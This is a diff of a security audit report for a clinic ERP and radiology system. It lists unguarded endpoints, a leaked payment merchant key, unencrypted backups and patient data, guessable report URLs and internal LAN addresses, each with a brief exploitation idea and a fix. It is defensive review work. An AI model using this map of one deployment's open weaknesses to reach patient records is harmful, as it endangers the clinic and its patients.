-
-### LOW-007: `POST /api/clinic-settings/ollama` — No Permission Guard
-
-**Route:** Added in Phase 11 (commit 4250dab)
-**Severity:** 🔵 Low
-**Finding:** The new Ollama settings endpoint (`POST /clinic-settings/ollama`) is mounted under `/clinic-settings` which requires `requireStaffSubPermission("/settings", "clinic")` for non-GET requests. However, the POST handler is added AFTER the `export default` statement, which means it relies on Express route order being correct. Should be verified.
-**Fix:** Add explicit `requireStaffSubPermission("/settings", "clinic")` guard inside the POST handler or move it before export.
+### 17. Environment Variable Security
+*   **Severity:** **High**
+*   **Description:** Sensitive keys (such as `JWT_SECRET`, `SESSION_SECRET`, `ICICI_SECRET_KEY`) are loaded from raw `.env` files, and default fallback keys are hardcoded in `docker-compose.yml`.
+*   **Affected Modules:** [docker-compose.yml](file:///c:/Users/abina/caredeoghar--antigravity/docker-compose.yml), `.env` template
+*   **Possible Exploitation Method:** An attacker accesses a leaked git repository or config files and extracts fallback production database credentials.
+*   **Recommended Remediation:** Add `.env` to `.gitignore`, remove default fallback values from `docker-compose.yml`, and manage keys using Docker secrets or a secure credentials vault on the Synology DSM.
 
 ---
 
-## Authentication Summary
-
-### What is Well-Secured ✅
-
-| Route Group | Auth | Permission | Notes |
-|-------------|------|-----------|-------|
-| `/admin/audit-logs` | Super Admin + USB | ✅ | Double-gated |
-| `/admin/role-permissions` | Super Admin + USB | ✅ | Double-gated |
-| `/admin/system-health` | Super Admin + USB | ✅ | Double-gated |
-| `/commission` | Super Admin | ✅ | Financial data |
-| `/doctor-ledger` | Super Admin | ✅ | Financial data |
-| `/backup` | Super Admin | ✅ | Sensitive |
-| `/system` | Super Admin | ✅ | System ops |
-| `/billing` | Staff Auth | `/billing` | ✅ |
-| `/accounting` | Staff Auth | `/accounting` | ✅ |
-| `/form-f` | Staff Auth | `/form-f` | ✅ PHI gated |
-| `/patient-reports` | Staff Auth | `/reports` | ✅ PHI gated |
-| `/pacs` | Staff Auth | `/dicom-nodes` | ✅ |
-| `/dicom` | Staff Auth | `/dicom-nodes` | ✅ |
-| `/patients` | Staff Auth | `/patients` | ✅ |
-| Internal cron | `CRON_SECRET` | — | ✅ Env-key gated |
-| Internal radiology | `INTERNAL_API_KEY` | — | ✅ Env-key gated (prod) |
-
-### What Lacks Sufficient Auth ⚠️
-
-| Route Group | Current Auth | Missing |
-|-------------|-------------|---------|
-| `POST /radiology/routing-rules` | Staff Auth only | Admin/infrastructure permission |
-| `POST /radiology/pacs-settings/load-defaults` | Staff Auth only | Admin permission |
-| `POST /scan-sessions/pair` | None (token only) | Staff Auth for pairing |
-| `GET /scan-sessions/mobile-poll/:deviceId` | None | Rate limit + deviceId validation |
-| `POST /scan-sessions/upload/:token` | None | Rate limit + size cap |
-| `GET /public/booking/my-bookings` | None | OTP or rate limit |
-| `GET /public/booking/config` | None | Remove `payuMerchantKey` |
-| `GET /clinic-settings/` | Staff Auth (any) | Redact payment secrets |
+### 18. Docker Security
+*   **Severity:** **Medium**
+*   **Description:** Containers run with root privileges inside the container context. If a container breakout occurs, the host OS (Synology DSM) could be compromised.
+*   **Affected Modules:** `docker-compose.yml`
+*   **Possible Exploitation Method:** An attacker exploits a Node.js process vulnerability to execute a container breakout, obtaining root privileges on the Synology NAS.
+*   **Recommended Remediation:** Run Docker processes as non-root users (`USER node` in Dockerfile) and restrict volume mounts to read-only directories where possible.
 
 ---
 
-## Payment Gateway Security
-
-| Gateway | Signature Verified | Server-Side Amount Check | Notes |
-|---------|--------------------|--------------------------|-------|
-| PayU | ✅ SHA512 HMAC | ❌ Client amount trusted | Fix: MED-004 |
-| PhonePe | ✅ Server-side status check | ❌ Client amount trusted | Fix: MED-004 |
-| BharatPe | Partial | ❌ Client amount trusted | Fix: MED-004 |
-| Razorpay | ✅ (in PaymentEngine) | ❌ Client amount trusted | Fix: MED-004 |
-| ICICI | ✅ (in PaymentEngine) | ❌ Client amount trusted | Fix: MED-004 |
-| Banking Webhook | ❌ No signature | — | Fix: MED-003 |
+### 19. Synology Deployment Security
+*   **Severity:** **Medium**
+*   **Description:** Synology DSM runs multiple packages. If ports `8888` or `5400` are exposed to the public internet without passing through a secure tunnel (like Tailscale), the internal interfaces are exposed to global scanners.
+*   **Affected Modules:** Synology network config
+*   **Possible Exploitation Method:** Global automated scanners find port `8888` exposed, and launch automated credential-stuffing attacks against the ERP login interface.
+*   **Recommended Remediation:** Bind all services strictly to Tailscale private interfaces (`100.x.x.x`) and disable global port forwarding on the clinic router.
 
 ---
 
-## DICOM / PACS Security
-
-| Surface | Auth | Risk |
-|---------|------|------|
-| Orthanc (192.168.1.137:8042) | None (LAN only) | LAN-only — OK |
-| OHIF (192.168.1.137:3010) | None (LAN only) | LAN-only — OK |
-| `/api/pacs` | Staff + `/dicom-nodes` | ✅ |
-| `/api/dicom` | Staff + `/dicom-nodes` | ✅ |
-| `/api/radiology/routing-rules` | Staff only | ⚠️ Missing admin check |
-| `/api/radiology/pacs-settings/load-defaults` | Staff only | ⚠️ Missing admin check |
-| DICOM C-ECHO (echoscu exec) | Staff | ⚠️ Shell injection risk (LOW-001) |
-| `/api/dicom-uploads` | Staff only | ⚠️ No DICOM permission check |
+### 20. Reverse Proxy Security
+*   **Severity:** **Medium**
+*   **Description:** The Nginx reverse proxy routes traffic. If Nginx headers do not enforce standard security settings (like HSTS, CSP, X-Frame-Options), browsers could be subject to framing attacks.
+*   **Affected Modules:** [nginx.conf](file:///c:/Users/abina/caredeoghar--antigravity/docker/nginx.conf)
+*   **Possible Exploitation Method:** An attacker frames the ERP interface inside a malicious site to execute clickjacking attacks.
+*   **Recommended Remediation:** Configure Nginx to return `X-Frame-Options: DENY` and `Content-Security-Policy: frame-ancestors 'none';`.
 
 ---
 
-## Recommended Fix Priority
-
-### Immediate (Before Next Deploy)
-1. **CRIT-001**: Remove `payuMerchantKey` from public booking config response
-2. **CRIT-002**: Add rate limit + size cap to scan session upload endpoint
-3. **HIGH-003**: Redact payment secrets from `GET /clinic-settings/`
-
-### This Sprint
-4. **HIGH-001**: Add admin permission to PACS routing rule mutations
-5. **HIGH-002**: Require `requireStaffAuth` for phone pairing
-6. **HIGH-006**: Add deviceId validation + rate limit to mobile poll
-7. **MED-004**: Server-side total amount calculation for all payment gateways
-8. **MED-005**: OTP or rate limit on `my-bookings` public endpoint
-
-### Next Sprint
-9. **MED-003**: Banking webhook signature verification
-10. **MED-006**: WhatsApp webhook signature verification
-11. **MED-007**: Rate limit internal backup stream
-12. **LOW-001**: Refactor echoscu call to use `execFile` with argument array
-13. **LOW-003**: Hash USB key in env instead of storing plaintext
-14. **CRIT-003**: Require `INTERNAL_API_KEY` in all environments (not just production)
+### 21. Backup Security
+*   **Severity:** **High**
+*   **Description:** System backups are generated as unencrypted SQL dumps stored in `/app/data/backups/`. Anyone with filesystem access can read the entire database.
+*   **Affected Modules:** `backupReplication.ts`, `backup.ts`
+*   **Possible Exploitation Method:** An attacker steals an external backup disk or extracts an archive from the directory, reading sensitive medical records.
+*   **Recommended Remediation:** Encrypt backup archives using AES-256 (via zip/pgp) before writing them to disk or replication servers.
 
 ---
 
-## Non-Issues (Confirmed Safe)
+### 22. Audit Log Integrity
+*   **Severity:** **Medium**
+*   **Description:** Audit logs are written to the standard `audit_logs` table. Since there are no cryptographic checksum chains (like hash chains), an attacker with database edit privileges can rewrite log history.
+*   **Affected Modules:** `audit-logs.ts`, `auditLogsTable`
+*   **Possible Exploitation Method:** A rogue employee deletes logs associated with an unauthorized discount override, concealing the event.
+*   **Recommended Remediation:** Write audit logs to read-only syslog servers or compute hash chains (where log $N$ includes a hash of log $N-1$) to make tempering immediately evident.
 
-- ✅ Session tokens are cryptographically random (not guessable)
-- ✅ SQL injection: Drizzle ORM with parameterized queries throughout
-- ✅ XSS: API is JSON-only; no HTML rendering
-- ✅ CORS: Not audited here (managed at reverse proxy / Cloudflare level)
-- ✅ DB schema: All input validated via Zod before DB writes in critical routes
-- ✅ Logo upload: 1.5MB cap enforced, base64 only, no file path traversal
-- ✅ File path traversal: DICOM upload uses `crypto.randomBytes` for filename, not user input
-- ✅ Password storage: Uses bcrypt (confirmed in user auth flow)
-- ✅ Public reports: Token-gated, tokens are study-specific not reusable across studies
-- ✅ Teleradiology shares: Token-gated with expiry
-- ✅ HL7 inbound: `INTERNAL_API_KEY` protected
-- ✅ Rate limiting: Login (10/15min), backup (5/hr), upload (20/5min), DICOM upload (10/10min)
+---
+
+### 23. Patient Data Protection
+*   **Severity:** **High**
+*   **Description:** Personally Identifiable Information (PII) such as patient names, phone numbers, and emails are stored as unencrypted text fields in the database.
+*   **Affected Modules:** `patients.ts`, `patientsTable`
+*   **Possible Exploitation Method:** An attacker gaining read-only access to the database extracts the entire patient table to compile a contact whitelist.
+*   **Recommended Remediation:** Encrypt highly sensitive columns (such as phone numbers and emails) at rest using symmetric encryption (AES-GCM).
+
+---
+
+### 24. Data Leakage Risks
+*   **Severity:** **Medium**
+*   **Description:** Diagnostic reports are fetched using simple URL routing. If patient verification links are easily guessable or lack token checks, records could be exposed.
+*   **Affected Modules:** `/api/p/r/:id` (public report download)
+*   **Possible Exploitation Method:** An attacker iterates over report URLs (e.g. changing numeric IDs) to download unauthorized medical reports.
+*   **Recommended Remediation:** Generate cryptographically secure, random hash strings (UUIDs) for public sharing links, rather than exposing auto-incrementing database IDs.
